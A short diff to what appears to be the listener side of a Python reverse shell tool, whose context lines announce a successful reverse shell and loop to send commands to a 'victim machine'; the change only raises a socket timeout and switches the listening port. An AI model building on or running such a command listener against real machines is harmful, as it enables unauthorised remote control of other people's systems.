@@ -22,7 +22,7 @@ def main(listening_port):
     print(colored('------------------Reverse Shell Setup was successful.-------------------------', 'green'))
 
     # Set time limit, if receiving data takes longer than 5 seconds, it will abort
-    c.settimeout(5)
+    c.settimeout(30)
 
     # While Loop to stay connected until Error occurs and send commands to victim machine
     while True:
@@ -40,4 +40,4 @@ def main(listening_port):
             print('Unknown Command...')
 
 
-main(65)
+main(69)
